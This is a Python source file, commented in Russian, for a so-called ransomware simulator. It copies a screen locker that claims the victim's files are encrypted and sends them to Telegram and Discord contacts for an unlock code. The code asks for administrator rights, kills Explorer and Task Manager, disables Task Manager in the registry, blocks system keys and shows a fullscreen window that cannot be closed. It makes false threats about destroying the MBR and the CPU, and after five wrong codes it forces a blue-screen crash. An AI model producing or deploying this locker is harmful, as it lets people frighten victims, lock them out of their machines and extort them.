# -*- coding: utf-8 -*-
"""
GRIFERS RANSOMWARE SIMULATOR - ТОЧНАЯ КОПИЯ ИНТЕРФЕЙСА
Полное соответствие оригинальному интерфейсу (синий фон, такое же расположение)
Code: 1234 | Telegram: @Ivan_Abrikos | Discord: mrgrishast_51442
"""
import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import sys
import socket
import threading
import time

# ==================== БЫСТРАЯ ПОЛНОЭКРАННАЯ АНИМАЦИЯ ====================
def show_death_animation():
    """Показывает быструю полноэкранную анимацию Смерти с косой"""
    
    os.system('')
    
    death_art = r"""
             ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::: ;::::::#/               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
    """
    
    warning_text = [
        "╔══════════════════════════════════════════════════════════════════════════════╗",
        "║                                                                              ║",
        "║                    💀 СМЕРТЬ ПРИШЛА ЗА ТВОИМИ ФАЙЛАМИ 💀                     ║",
        "║                                                                              ║",
        "║              ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ. ОНИ БУДУТ УНИЧТОЖЕНЫ.                  ║",
        "║                                                                              ║",
        "║                       Telegram: @Ivan_Abrikos                                ║",
        "║                       Discord:  mrgrishast_51442                             ║",
        "║                                                                              ║",
        "╚══════════════════════════════════════════════════════════════════════════════╝"
    ]
    
    # Очищаем и делаем полноэкранный режим консоли
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.name == 'nt':
        os.system('mode con cols=120 lines=40')
        os.system('color 01')  # Синий фон
    
    # Быстрый показ арта (всего 1 секунда)
    for _ in range(2):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n" * 5)
        for line in death_art.split('\n'):
            print(f"\033[94m{line}\033[0m")  # Синий цвет
        time.sleep(0.3)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.1)
    
    # Финальный показ с предупреждением
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n" * 3)
    for line in death_art.split('\n'):
        print(f"\033[94m{line}\033[0m")
        time.sleep(0.02)
    
    print("\n")
    for line in warning_text:
        print(f"\033[94m{line}\033[0m")
        time.sleep(0.03)
    
    time.sleep(1)

# ==================== КОНФИГ ====================
UNLOCK_CODE = "1234"
PC_NAME = socket.gethostname()
TELEGRAM_CONTACT = "@Ivan_Abrikos"
DISCORD_CONTACT = "mrgrishast_51442"

class GrifersRansomwareSimulator:
    def __init__(self):
        self.root = None
        self.entry = None
        self.attempts = 0
        self.max_attempts = 5
        
        show_death_animation()
        self.create_gui()
        
    def create_gui(self):
        """Создание GUI с синим фоном (ТОЧНО КАК В ОРИГИНАЛЕ)"""
        self.root = tk.Tk()
        self.root.title("Ваши файлы зашифрованы!")
        
        try:
            sw = self.root.winfo_screenwidth()
            sh = self.root.winfo_screenheight()
        except:
            sw, sh = 1920, 1080
            
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#0000aa')  # СИНИЙ ФОН КАК У BSOD
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.block_keys()
        
        # ==================== ИНТЕРФЕЙС (ТОЧНО КАК В ОРИГИНАЛЕ) ====================
        
        main_frame = tk.Frame(self.root, bg='#0000aa')
        main_frame.place(relx=0.5, rely=0.45, anchor=tk.CENTER)
        
        # Заголовок
        title = tk.Label(main_frame, text="Ваши файлы зашифрованы!",
                        font=('Arial', 28, 'bold'), fg='#ffffff', bg='#0000aa')
        title.pack(pady=(0, 20))
        
        # Основной текст (с Telegram и Discord)
        main_text = f"""Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован,
а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой.

Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред
Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления.

При попытке снять блокировку MBR (главный загрузчик материнки) будет снесён и будет подана
рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности.

Чтобы получить код, напишите {TELEGRAM_CONTACT} (Telegram) или {DISCORD_CONTACT} (Discord)"""
        
        text_label = tk.Label(main_frame, text=main_text, font=('Arial', 13),
                             fg='#ffffff', bg='#0000aa', justify=tk.CENTER)
        text_label.pack(pady=10)
        
        # Поле ввода
        code_label = tk.Label(main_frame, text="Введите код разблокировки:",
                             font=('Arial', 14), fg='#ffffff', bg='#0000aa')
        code_label.pack(pady=(30, 5))
        
        self.entry = tk.Entry(main_frame, font=('Arial', 14), show="",
                              bg='#ffffff', fg='#000000', width=25,
                              relief=tk.SUNKEN, bd=2,
                              justify='center')
        self.entry.pack(ipady=5)
        self.entry.focus()
        self.entry.bind('<Return>', lambda e: self.check_code())
        
        # Информация о ПК и кнопка
        bottom_frame = tk.Frame(main_frame, bg='#0000aa')
        bottom_frame.pack(pady=20)
        
        pc_label = tk.Label(bottom_frame, text=f"Current PC: {PC_NAME}",
                           font=('Arial', 11), fg='#ffffff', bg='#0000aa')
        pc_label.pack(side=tk.LEFT, padx=(0, 20))
        
        enter_btn = tk.Button(bottom_frame, text="Enter [Ввод]", font=('Arial', 11),
                             bg='#e0e0e0', fg='#000000', relief=tk.RAISED, bd=2,
                             padx=20, pady=3, command=self.check_code)
        enter_btn.pack(side=tk.LEFT)
        
        # Счётчик попыток
        self.attempts_label = tk.Label(main_frame, text="", font=('Arial', 10),
                                       fg='#ff6666', bg='#0000aa')
        self.attempts_label.pack(pady=10)
        
        self.lock_system()
        self.root.mainloop()
        
    def block_keys(self):
        def block():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'alt', 'f4', 
                          'delete', 'tab', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
        threading.Thread(target=block, daemon=True).start()
        
    def lock_system(self):
        try:
            os.system("taskkill /f /im explorer.exe >nul 2>&1")
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
        except:
            pass
            
    def unlock_system(self):
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
        
    def destroy_system(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0 /f")
            
    def check_code(self):
        code = self.entry.get().strip()
        
        if code == UNLOCK_CODE:
            self.unlock_system()
            self.root.destroy()
            return
            
        self.attempts += 1
        remaining = self.max_attempts - self.attempts
        
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.entry.delete(0, tk.END)
        
        if self.attempts >= self.max_attempts:
            self.destroy_system()
        else:
            messagebox.showerror("Неверный код", 
                                f"Неверный код разблокировки!\nОсталось попыток: {remaining}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Grifers_Ransomware_Mutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass
        
    GrifersRansomwareSimulator()